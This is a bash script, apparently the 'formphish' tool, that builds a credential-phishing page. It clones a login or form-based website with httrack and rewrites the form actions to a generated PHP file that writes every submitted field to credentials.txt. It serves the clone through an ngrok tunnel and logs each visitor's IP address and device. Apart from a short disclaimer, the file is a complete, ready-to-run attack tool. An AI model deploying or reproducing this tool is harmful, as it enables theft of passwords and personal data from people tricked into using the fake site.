#!/bin/bash
# Coded by: github.com/thelinuxchoice/formphish
# Twitter: @linux_choice
# Read the License before using any part from this code.

trap 'printf "\n";stop' 2

banner() {

printf "\e[1;92m    __\e[0m\e[1;77m   __                      \e[1;93m      _     _     _     \e[0m\e[1;92m __    \n"
printf "\e[1;92m   / /\e[0m\e[1;77m  / _|                     \e[1;93m     | |   (_)   | |    \e[0m\e[1;92m \ \   \n"
printf "\e[1;92m  / / \e[0m\e[1;77m | |_ ___  _ __ _ __ ___   \e[1;93m_ __ | |__  _ ___| |__  \e[0m\e[1;92m  \ \  \n"
printf "\e[1;92m < <  \e[0m\e[1;77m |  _/ _ \| '__| '_ \` _ \ \e[1;93m| '_ \| '_ \| / __| '_ \ \e[0m\e[1;92m   > > \n"
printf "\e[1;92m  \ \ \e[0m\e[1;77m | || (_) | |  | | | | | |\e[1;93m| |_) | | | | \__ \ | | | \e[0m\e[1;92m / /  \n"
printf "\e[1;92m   \_\ \e[0m\e[1;77m|_| \___/|_|  |_| |_| |_|\e[1;93m| .__/|_| |_|_|___/_| |_|\e[0m\e[1;92m /_/   \n"
printf "\e[1;93m                                | |                             \n"
printf "\e[1;93m                                |_| v1.0                             \n"


printf " \n\e[1;77m coded by: github.com/thelinuxchoice/formphish\e[0m \n"
printf " \e[1;77mtwitter: @linux_choice\e[1;77m\e[0m"
printf "\n\n\n\e[1;91m Disclaimer: this tool is designed for security\n"
printf " testing in an authorized simulated cyberattack\n"
printf " Attacking targets without prior mutual consent\n"
printf " is illegal!\n"

printf "\n"



}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
#checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
#if [[ $checkssh == *'ssh'* ]]; then
#killall -2 ssh > /dev/null 2>&1
#fi
exit 1

}

dependencies() {


command -v httrack > /dev/null 2>&1 || { echo >&2 "I require Httrack but it's not installed. Install it. Aborting."; exit 1; }
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 


}


catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
device=$(grep -o ';.*;*)' ip.txt | cut -d ')' -f1 | tr -d ";")
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Device:\e[0m\e[1;77m %s\e[0m\n" $device
cat ip.txt >> saved.ip.txt


}

checkfound() {

index_file=$(grep -o 'HREF=".*"' index2.html | cut -d '"' -f2)
dir_name=$(dirname $index_file)
base_name=$(basename $index_file)
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "$dir_name/credentials.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Information received!\e[0m\n"
printf "\e[1;93m\n"
cat $dir_name/credentials.txt
printf "\e[0m\n"
cat $dir_name/credentials.txt >> credentials.saved.txt
rm -rf $dir_name/credentials.txt
printf "\n\e[1;92m[\e[0m+\e[1;92m] Saved:\e[0m\e[1;77m %s/credentials.txt\e[0m\n" $dir_name 
fi

sleep 0.5

done 

}



ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m+\e[1;33m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
checkfound
}


build() {

mv index.html index2.html
index_file=$(grep -o 'HREF=".*"' index2.html | cut -d '"' -f2)
dir_name=$(dirname $index_file)
base_name=$(basename $index_file)
cat_file="cat.php"


if [ -f "$index_file" ]; then

 echo "$index_file exist"
 grep -o 'action=".*\"' $index_file | cut -d '"' -f2 > old_action.txt

 while  read -r line
 do
   IFS=$'\n'
   sed 's+'$line'+'$cat_file'+g' $index_file > index3.html

 done < old_action.txt

fi
mv index3.html $dir_name/$base_name


echo "<?php" > $dir_name/cat.php
printf "\nheader(\"Location: %s\");\n" $website >> $dir_name/cat.php

while  read -r line
 do
   IFS=$'\n'

printf "\nif (!empty(\$_POST['%s'])) {" $line >> $dir_name/cat.php
printf "file_put_contents(\"credentials.txt\", \"%s: \"  . \$_POST['%s'] . \"\\n\", FILE_APPEND);" $line $line >> $dir_name/cat.php
printf "\n}" >>  $dir_name/cat.php

printf "\nif (!empty(\$_GET['%s'])) {" $line >> $dir_name/cat.php
printf "file_put_contents(\"credentials.txt\", \"%s: \"  . \$_GET['%s'] . \"\\n\", FILE_APPEND);" $line $line >> $dir_name/cat.php
printf "\n}" >>  $dir_name/cat.php

 done < inputs.txt

printf "\nexit();" >> $dir_name/cat.php

sed 's+redirect_url+'$dir_name/$base_name'+g' index_php > index.php
ngrok_server

}

check_website() {

#default_website=""

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Form-based website to phishing: \e[0m'
read website
#website="${website:-${default_website}}"

if [ -z "$website" ]; then
 exit 1
fi


if [ "${website:0:4}" != "http" ]; then

printf "\e[1;93mMissing \e[0m\e[1;77mhttp/https\e[0m\n"
exit 1
fi

printf "\e[1;92mChecking website...\e[0m\n"

python extract_input.py $website  > inputs.txt

if [[ $(cat inputs.txt) == "" ]] || [[ $(cat inputs.txt) == "Error" ]]; then

  printf "\e[1;93mForm-based inputs not found! Exiting...\e[0m\n"
  exit 1

else

 printf "\e[1;92mInputs Found! Cloning website using Httrack...\e[0m\n"
 httrack --clean -Q -q -K -* --index $website
 build

fi

}

banner
dependencies
check_website

